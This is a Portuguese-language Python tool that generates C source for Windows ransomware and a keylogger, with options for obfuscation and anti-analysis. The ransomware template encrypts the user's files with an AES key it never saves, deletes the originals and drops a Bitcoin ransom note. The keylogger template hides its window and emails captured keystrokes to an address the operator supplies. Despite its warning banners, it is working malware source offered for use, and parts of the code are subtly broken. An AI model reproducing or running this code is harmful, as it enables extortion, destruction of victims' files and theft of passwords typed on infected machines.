#!/data/data/com.termux/files/usr/bin/python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import random
import base64
import zlib
import platform
import hashlib
import json
from typing import Dict, List, Optional

# Criptografia
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

# Interface colorida
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.prompt import Prompt, Confirm, IntPrompt
from rich.progress import Progress
from rich.text import Text
from rich.syntax import Syntax

console = Console()

class GeradorPayloadsCElite:
    def __init__(self):
        self.payloads = {
            'ransomware': {
                'function': self.gerar_ransomware_c,
                'category': 'Destrutivos',
                'danger_level': 'critical',
                'description': 'Ransomware em C que criptografa arquivos'
            },
            'keylogger': {
                'function': self.gerar_keylogger_c,
                'category': 'Keyloggers',
                'danger_level': 'high',
                'description': 'Keylogger em C para Windows'
            }
        }
        
        self.tecnicas_ofuscacao = {
            'polimorfico': 'Ofuscação polimórfica',
            'metamorfico': 'Ofuscação metamórfica',
            'criptografar': 'Criptografia AES-256',
            'fragmentado': 'Fragmentação de código',
            'anti_analise': 'Técnicas anti-análise'
        }
        
        self.banners = [
            self._gerar_banner_apocaliptico(),
            self._gerar_banner_matrix(),
            self._gerar_banner_sangue()
        ]
        
        self._verificar_dependencias()
    
    def _gerar_banner_apocaliptico(self) -> str:
        return """
[bold red]
 ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄▄  ▄▄▄▄▄▄▄▄▄▄  
▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░▌ 
▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀▀▀▀█░▌
▐░▌          ▐░▌       ▐░▌▐░▌          ▐░▌          ▐░▌       ▐░▌
▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄▄▄ ▐░▌       ▐░▌
▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░▌       ▐░▌
▐░█▀▀▀▀▀▀▀▀▀ ▐░█▀▀▀▀█░█▀▀  ▀▀▀▀▀▀▀▀▀█░▌▐░█▀▀▀▀▀▀▀▀▀ ▐░▌       ▐░▌
▐░▌          ▐░▌     ▐░▌            ▐░▌▐░▌          ▐░▌       ▐░▌
▐░▌          ▐░▌      ▐░▌  ▄▄▄▄▄▄▄▄▄█░▌▐░█▄▄▄▄▄▄▄▄▄ ▐░█▄▄▄▄▄▄▄█░▌
▐░▌          ▐░▌       ▐░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░░▌▐░░░░░░░░░░▌ 
 ▀            ▀         ▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀  
[/bold red]
[bold white on red]    GERADOR DE PAYLOADS C ELITE v7.0 - DARK CODING[/bold white on red]
"""
    
    def _verificar_dependencias(self):
        required = {
            'pycryptodome': 'pycryptodomex',
            'rich': 'rich'
        }
        
        missing = []
        for pkg, install_name in required.items():
            try:
                __import__(pkg)
            except ImportError:
                missing.append(install_name)
        
        if missing:
            console.print(Panel.fit(
                f"[red]✗ Dependências faltando: {', '.join(missing)}[/red]",
                title="[bold red]ERRO[/bold red]",
                border_style="red"
            ))
            if Confirm.ask("Deseja instalar automaticamente?"):
                with Progress() as progress:
                    task = progress.add_task("[red]Instalando...[/red]", total=len(missing))
                    for pkg in missing:
                        os.system(f"pip install {pkg} --quiet")
                        progress.update(task, advance=1)
                console.print("[green]✓ Dependências instaladas![/green]")
                time.sleep(1)
    
    def mostrar_banner(self):
        console.print(random.choice(self.banners))
        console.print(Panel.fit(
            "[blink bold red]⚠️ USO ILEGAL É CRIME! USE APENAS PARA TESTES AUTORIZADOS! ⚠️[/blink bold red]",
            style="red on black"
        ))
        time.sleep(1)
    
    def mostrar_menu_principal(self):
        while True:
            console.clear()
            self.mostrar_banner()
            
            tabela = Table(
                title="[bold cyan]🔧 MENU PRINCIPAL (C LANGUAGE)[/bold cyan]",
                show_header=True,
                header_style="bold magenta"
            )
            tabela.add_column("Opção", style="cyan", width=10)
            tabela.add_column("Payload", style="green")
            tabela.add_column("Perigo", style="red")
            tabela.add_column("Descrição")
            
            for i, (nome, dados) in enumerate(self.payloads.items(), 1):
                perigo = "💀 CRÍTICO" if dados['danger_level'] == 'critical' else "🔥 ALTO"
                tabela.add_row(str(i), nome, perigo, dados['description'])
            
            tabela.add_row("0", "Técnicas", "⚙️", "Opções de ofuscação")
            tabela.add_row("9", "Sair", "🚪", "Encerrar o programa")
            
            console.print(tabela)
            
            escolha = Prompt.ask(
                "[blink yellow]➤[/blink yellow] Selecione",
                choices=[str(i) for i in range(0, len(self.payloads)+1)] + ['9'],
                show_choices=False
            )
            
            if escolha == "1":
                self._processar_payload('ransomware')
            elif escolha == "2":
                self._processar_payload('keylogger')
            elif escolha == "0":
                self._mostrar_menu_tecnicas()
            elif escolha == "9":
                self._sair()
    
    def _mostrar_menu_tecnicas(self):
        while True:
            console.clear()
            console.print(Panel.fit(
                "[bold cyan]⚙️ TÉCNICAS DE OFUSCAÇÃO[/bold cyan]",
                border_style="cyan"
            ))
            
            tabela = Table(show_header=True, header_style="bold blue")
            tabela.add_column("ID", style="cyan", width=5)
            tabela.add_column("Técnica", style="green")
            tabela.add_column("Descrição")
            
            for i, (codigo, desc) in enumerate(self.tecnicas_ofuscacao.items(), 1):
                tabela.add_row(str(i), desc, self._descricao_tecnica(codigo))
            
            console.print(tabela)
            
            escolha = Prompt.ask(
                "[blink yellow]➤[/blink yellow] Selecione (0 para voltar)",
                choices=[str(i) for i in range(0, len(self.tecnicas_ofuscacao)+1)],
                show_choices=False
            )
            
            if escolha == "0":
                return
    
    def _descricao_tecnica(self, codigo: str) -> str:
        descricoes = {
            'polimorfico': "Altera a estrutura do código a cada compilação",
            'metamorfico': "Muda completamente a aparência do código",
            'criptografar': "Criptografa o payload com AES-256",
            'fragmentado': "Divide o código em partes separadas",
            'anti_analise': "Adiciona verificações anti-debugging"
        }
        return descricoes.get(codigo, "Sem descrição disponível")
    
    def _processar_payload(self, nome_payload: str):
        payload_data = self.payloads[nome_payload]
        
        if payload_data['danger_level'] in ['high', 'critical']:
            console.print(Panel.fit(
                "[blink bold red]⚠️ PERIGO ELEVADO ⚠️[/blink bold red]\n"
                "Este payload pode causar danos permanentes ou violar leis.\n"
                "Use apenas em ambientes controlados e com autorização!",
                border_style="red"
            ))
            
            if not Confirm.ask("Confirmar criação?", default=False):
                return
        
        config = self._configurar_payload(nome_payload)
        if config is None:
            return
        
        ofuscar = Confirm.ask("Aplicar técnicas de ofuscação?")
        tecnicas = []
        if ofuscar:
            tecnicas = self._selecionar_tecnicas_ofuscacao()
        
        with Progress() as progress:
            task = progress.add_task("[red]Gerando código C...[/red]", total=100)
            
            payload = payload_data['function'](**config)
            progress.update(task, advance=40)
            
            if ofuscar:
                for tecnica in tecnicas:
                    payload = self._ofuscar_codigo_c(payload, tecnica)
                    progress.update(task, advance=15)
            
            progress.update(task, completed=100)
        
        self._preview_payload(payload, 'c')
        self._salvar_payload(nome_payload, payload)
    
    def _configurar_payload(self, nome_payload: str) -> Optional[Dict]:
        config = {}
        
        if nome_payload == 'ransomware':
            console.print(Panel.fit(
                "[bold red]Configuração do Ransomware[/bold red]",
                border_style="red"
            ))
            config['extensoes'] = Prompt.ask(
                "[yellow]?[/yellow] Extensões (separadas por vírgula)",
                default=".doc,.docx,.xls,.xlsx,.pdf,.jpg,.png,.txt"
            ).split(',')
            config['resgate'] = Prompt.ask(
                "[yellow]?[/yellow] Mensagem de resgate",
                default="Seus arquivos foram criptografados! Pague 0.5 BTC para descriptografar."
            )
            config['email'] = Prompt.ask(
                "[yellow]?[/yellow] E-mail para contato",
                default="pagamento@darknet.com"
            )
        
        elif nome_payload == 'keylogger':
            console.print(Panel.fit(
                "[bold]Configuração do Keylogger[/bold]",
                border_style="blue"
            ))
            config['email'] = Prompt.ask(
                "[yellow]?[/yellow] E-mail para envio dos logs",
                default="hacker@protonmail.com"
            )
            config['intervalo'] = IntPrompt.ask(
                "[yellow]?[/yellow] Intervalo de envio (minutos)",
                default=30
            )
        
        console.print("\n[bold]Resumo:[/bold]")
        for chave, valor in config.items():
            console.print(f"  [cyan]{chave}:[/cyan] {valor}")
        
        if not Confirm.ask("Confirmar configurações?"):
            return None
        
        return config
    
    def _selecionar_tecnicas_ofuscacao(self) -> List[str]:
        console.print("\n[bold]Técnicas de Ofuscação:[/bold]")
        tabela = Table(show_header=True, header_style="bold magenta")
        tabela.add_column("ID", style="cyan", width=5)
        tabela.add_column("Técnica", style="green")
        
        for i, (codigo, desc) in enumerate(self.tecnicas_ofuscacao.items(), 1):
            tabela.add_row(str(i), desc)
        
        console.print(tabela)
        
        escolhas = Prompt.ask(
            "[yellow]?[/yellow] Selecione as técnicas (separadas por vírgula)",
            default="1,3,5"
        )
        
        return [list(self.tecnicas_ofuscacao.keys())[int(x)-1] for x in escolhas.split(',')]
    
    def _preview_payload(self, payload: str, language: str = 'c'):
        console.print(Panel.fit(
            "[bold]PRÉ-VISUALIZAÇÃO DO CÓDIGO C[/bold]",
            border_style="yellow"
        ))
        
        lines = payload.split('\n')[:30]
        code = '\n'.join(lines)
        
        console.print(Syntax(code, language, theme="monokai", line_numbers=True))
        
        if len(payload.split('\n')) > 30:
            console.print("[yellow]... (truncado, mostrando apenas as primeiras 30 linhas)[/yellow]")
    
    def _salvar_payload(self, nome_payload: str, payload: str):
        nome_arquivo = Prompt.ask(
            "[yellow]?[/yellow] Nome do arquivo C",
            default=f"payload_{nome_payload}.c"
        )
        
        try:
            with open(nome_arquivo, 'w', encoding='utf-8') as f:
                f.write(payload)
            
            with open(nome_arquivo, 'rb') as f:
                md5 = hashlib.md5(f.read()).hexdigest()
                sha256 = hashlib.sha256(f.read()).hexdigest()
            
            console.print(Panel.fit(
                f"[green]✓ Arquivo C salvo como [bold]{nome_arquivo}[/bold][/green]\n"
                f"[cyan]MD5: [bold]{md5}[/bold][/cyan]\n"
                f"[cyan]SHA256: [bold]{sha256}[/bold][/cyan]\n\n"
                f"[yellow]Para compilar:[/yellow]\n"
                f"[white]gcc {nome_arquivo} -o {nome_arquivo[:-2]} -lcrypto -lssl[/white]",
                title="[bold green]SUCESSO[/bold green]",
                border_style="green"
            ))
            
        except Exception as e:
            console.print(Panel.fit(
                f"[red]✗ Erro: {str(e)}[/red]",
                title="[bold red]ERRO[/bold red]",
                border_style="red"
            ))
        
        input("\nPressione Enter para continuar...")
    
    def _ofuscar_codigo_c(self, payload: str, tecnica: str) -> str:
        if tecnica == 'polimorfico':
            return self._ofuscar_polimorfico_c(payload)
        elif tecnica == 'metamorfico':
            return self._ofuscar_metamorfico_c(payload)
        elif tecnica == 'criptografar':
            return self._ofuscar_com_criptografia_c(payload)
        elif tecnica == 'fragmentado':
            return self._ofuscar_fragmentado_c(payload)
        elif tecnica == 'anti_analise':
            return self._adicionar_anti_analise_c(payload)
        return payload
    
    def _ofuscar_polimorfico_c(self, payload: str) -> str:
        # Substitui nomes de variáveis por aleatórios
        vars = ['i', 'j', 'k', 'x', 'y', 'z', 'a', 'b', 'c']
        new_vars = [f'v{random.randint(100,999)}' for _ in vars]
        
        for old, new in zip(vars, new_vars):
            payload = payload.replace(f' {old} ', f' {new} ')
            payload = payload.replace(f' {old};', f' {new};')
            payload = payload.replace(f'({old})', f'({new})')
        
        # Adiciona código morto
        dead_code = [
            f"for(int {random.choice(new_vars)}=0; {random.choice(new_vars)}<{random.randint(5,20)}; {random.choice(new_vars)}++) {{ /* dead code */ }}",
            f"if({random.randint(0,1)}) {{ /* junk */ }} else {{ /* junk */ }}",
            f"#define {''.join(random.choices('ABCDEFGHIJKLMNOPQRSTUVWXYZ', k=6))} {random.randint(100,999)}"
        ]
        
        lines = payload.split('\n')
        insert_pos = random.randint(5, len(lines)-5)
        lines.insert(insert_pos, '\n'.join(dead_code))
        
        return '\n'.join(lines)
    
    def _ofuscar_metamorfico_c(self, payload: str) -> str:
        # Transforma estruturas de controle
        payload = payload.replace('for(', 'for (')
        payload = payload.replace('while(', 'while (')
        payload = payload.replace('if(', 'if (')
        
        # Adiciona macros aleatórias
        macros = [
            f"#define {''.join(random.choices('ABCDEFG', k=5))}(x) (x*{random.randint(2,5)})",
            f"#define {''.join(random.choices('HIJKLMN', k=4))}_{random.randint(1,9)} 0x{random.randint(100,999):x}"
        ]
        
        return '\n'.join(macros) + '\n\n' + payload
    
    def _ofuscar_com_criptografia_c(self, payload: str) -> str:
        # Divide o payload em partes e criptografa cada parte
        parts = []
        chunk_size = len(payload) // 4
        for i in range(0, len(payload), chunk_size):
            part = payload[i:i+chunk_size]
            parts.append(base64.b64encode(part.encode()).decode())
        
        # Gera código para descriptografar
        decrypt_code = """
#include <openssl/aes.h>
#include <string.h>
#include <stdlib.h>

void decrypt_payload(const char* encrypted, char* output) {
    AES_KEY aes_key;
    unsigned char key[] = {0x00,0x11,0x22,0x33,0x44,0x55,0x66,0x77,0x88,0x99,0xAA,0xBB,0xCC,0xDD,0xEE,0xFF};
    unsigned char iv[] = {0x00,0x01,0x02,0x03,0x04,0x05,0x06,0x07,0x08,0x09,0x0A,0x0B,0x0C,0x0D,0x0E,0x0F};
    
    AES_set_decrypt_key(key, 128, &aes_key);
    AES_cbc_encrypt((unsigned char*)encrypted, (unsigned char*)output, strlen(encrypted), &aes_key, iv, AES_DECRYPT);
}

int main() {
    char* encrypted_parts[] = {
        %s
    };
    
    char buffer[4096];
    for(int i=0; i<%d; i++) {
        decrypt_payload(encrypted_parts[i], buffer);
        /* Executar o código descriptografado */
    }
    return 0;
}
""" % (',\n        '.join([f'"{part}"' for part in parts]), len(parts))
        
        return decrypt_code
    
    def _ofuscar_fragmentado_c(self, payload: str) -> str:
        # Divide o código em funções separadas
        parts = []
        chunk_size = len(payload) // 5
        for i in range(0, len(payload), chunk_size):
            part = payload[i:i+chunk_size]
            func_name = f"func_{random.randint(1000,9999)}"
            parts.append(f"void {func_name}() {{\n{part}\n}}")
        
        # Gera código para chamar as funções
        call_code = "int main() {\n"
        for part in parts:
            func_name = part.split(' ')[1].split('(')[0]
            call_code += f"    {func_name}();\n"
        call_code += "    return 0;\n}"
        
        return '\n\n'.join(parts) + '\n\n' + call_code
    
    def _adicionar_anti_analise_c(self, payload: str) -> str:
        anti_code = """
#include <windows.h>
#include <tchar.h>

BOOL IsDebuggerPresent() {
    return IsDebuggerPresent();
}

BOOL IsInsideVM() {
    unsigned int hypervisor_bit;
    __asm {
        mov eax, 1
        cpuid
        bt ecx, 31
        setc hypervisor_bit
    }
    return hypervisor_bit;
}

void AntiAnalysis() {
    if(IsDebuggerPresent() || IsInsideVM()) {
        ExitProcess(1);
    }
}
"""
        return anti_code + "\n" + payload.replace("int main()", "int main() {\n    AntiAnalysis();")
    
    # Implementações dos payloads em C
    def gerar_ransomware_c(self, extensoes: List[str], resgate: str, email: str, **kwargs) -> str:
        ext_str = ', '.join(f'"{ext}"' for ext in extensoes)
        return f"""#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <openssl/aes.h>
#include <openssl/rand.h>

#define EXTENSIONS {len(extensoes)}
#define CHUNK_SIZE 1024

const char *extensions[EXTENSIONS] = {{{ext_str}}};
const char *ransom_note = "{resgate}\\n\\nContato: {email}";

unsigned char aes_key[32];
unsigned char iv[16];

void generate_key() {{
    RAND_bytes(aes_key, sizeof(aes_key));
    RAND_bytes(iv, sizeof(iv));
}}

int is_target_file(const char *filename) {{
    for(int i = 0; i < EXTENSIONS; i++) {{
        if(strstr(filename, extensions[i])) {{
            return 1;
        }}
    }}
    return 0;
}}

void encrypt_file(const char *filename) {{
    FILE *fp_in, *fp_out;
    unsigned char inbuf[CHUNK_SIZE], outbuf[CHUNK_SIZE + AES_BLOCK_SIZE];
    int bytes_read, out_len;
    char out_filename[256];
    
    AES_KEY enc_key;
    AES_set_encrypt_key(aes_key, 256, &enc_key);
    
    fp_in = fopen(filename, "rb");
    if(!fp_in) return;
    
    sprintf(out_filename, "%s.encrypted", filename);
    fp_out = fopen(out_filename, "wb");
    if(!fp_out) {{ fclose(fp_in); return; }}
    
    while((bytes_read = fread(inbuf, 1, CHUNK_SIZE, fp_in)) > 0) {{
        AES_cbc_encrypt(inbuf, outbuf, bytes_read, &enc_key, iv, AES_ENCRYPT);
        fwrite(outbuf, 1, bytes_read + AES_BLOCK_SIZE, fp_out);
    }}
    
    fclose(fp_in);
    fclose(fp_out);
    remove(filename);
}}

void process_directory(const char *path) {{
    DIR *dir;
    struct dirent *entry;
    char full_path[1024];
    
    if(!(dir = opendir(path))) return;
    
    while((entry = readdir(dir)) != NULL) {{
        if(strcmp(entry->d_name, ".") == 0 || strcmp(entry->d_name, "..") == 0)
            continue;
            
        snprintf(full_path, sizeof(full_path), "%s/%s", path, entry->d_name);
        
        if(entry->d_type == DT_DIR) {{
            process_directory(full_path);
        }} else if(is_target_file(entry->d_name)) {{
            encrypt_file(full_path);
        }}
    }}
    closedir(dir);
}}

void drop_ransom_note() {{
    FILE *fp = fopen("READ_ME.txt", "w");
    if(fp) {{
        fputs(ransom_note, fp);
        fclose(fp);
    }}
}}

int main() {{
    generate_key();
    process_directory("C:\\\\");
    drop_ransom_note();
    return 0;
}}"""
    
    def gerar_keylogger_c(self, email: str, intervalo: int, **kwargs) -> str:
        return f"""#include <windows.h>
#include <winuser.h>
#include <stdio.h>
#include <time.h>
#include <string.h>
#include <winsock2.h>
#include <ws2tcpip.h>

#pragma comment(lib, "ws2_32.lib")

#define INTERVAL ({intervalo} * 60 * 1000)
#define EMAIL "{email}"

HHOOK hHook = NULL;
char log_buffer[4096];
int buffer_pos = 0;
FILE *log_file = NULL;

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {{
    if (nCode >= 0) {{
        KBDLLHOOKSTRUCT *kbd = (KBDLLHOOKSTRUCT *)lParam;
        
        if (wParam == WM_KEYDOWN) {{
            char key = (char)MapVirtualKey(kbd->vkCode, 2);
            
            if (kbd->vkCode == VK_RETURN) {{
                strcat(log_buffer, "\\n");
            }} else if (kbd->vkCode == VK_SPACE) {{
                strcat(log_buffer, " ");
            }} else if (isalpha(key) || isdigit(key) || ispunct(key)) {{
                char str[2] = {{key, '\\0'}};
                strcat(log_buffer, str);
            }}
            
            buffer_pos++;
            
            if (buffer_pos >= sizeof(log_buffer) - 1) {{
                send_logs();
                buffer_pos = 0;
                memset(log_buffer, 0, sizeof(log_buffer));
            }}
        }}
    }}
    return CallNextHookEx(hHook, nCode, wParam, lParam);
}}

void send_logs() {{
    WSADATA wsa;
    SOCKET s;
    struct sockaddr_in server;
    
    if (WSAStartup(MAKEWORD(2,2), &wsa) != 0) return;
    
    if ((s = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET) return;
    
    server.sin_addr.s_addr = inet_addr("127.0.0.1");
    server.sin_family = AF_INET;
    server.sin_port = htons(25);
    
    if (connect(s, (struct sockaddr *)&server, sizeof(server)) < 0) {{
        closesocket(s);
        WSACleanup();
        return;
    }}
    
    char email[512];
    snprintf(email, sizeof(email),
        "MAIL FROM:<keylogger@local>\\r\\n"
        "RCPT TO:<%s>\\r\\n"
        "DATA\\r\\n"
        "Subject: Keylogger Report\\r\\n"
        "\\r\\n"
        "%s\\r\\n"
        ".\\r\\n", EMAIL, log_buffer);
    
    send(s, email, strlen(email), 0);
    closesocket(s);
    WSACleanup();
}}

DWORD WINAPI TimerThread(LPVOID lpParam) {{
    while (1) {{
        Sleep(INTERVAL);
        if (buffer_pos > 0) {{
            send_logs();
            buffer_pos = 0;
            memset(log_buffer, 0, sizeof(log_buffer));
        }}
    }}
    return 0;
}}

void stealth() {{
    HWND stealth;
    AllocConsole();
    stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(stealth, 0);
}}

int main() {{
    stealth();
    
    CreateThread(NULL, 0, TimerThread, NULL, 0, NULL);
    
    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {{
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }}
    
    UnhookWindowsHookEx(hHook);
    return 0;
}}"""
    
    def _sair(self):
        console.print(Panel.fit(
            "[blink bold red]⚠️ ATENÇÃO: USO ILEGAL PODE RESULTAR EM PRISÃO! ⚠️[/blink bold red]",
            border_style="red"
        ))
        console.print("[cyan]Saindo...[/cyan]")
        time.sleep(1)
        sys.exit(0)

def main():
    try:
        gerador = GeradorPayloadsCElite()
        gerador.mostrar_menu_principal()
    except KeyboardInterrupt:
        console.print("\n[red]✗ Cancelado pelo usuário[/red]")
        sys.exit(0)
    except Exception as e:
        console.print(f"\n[red]✗ Erro fatal: {str(e)}[/red]")
        sys.exit(1)

if __name__ == '__main__':
    main()
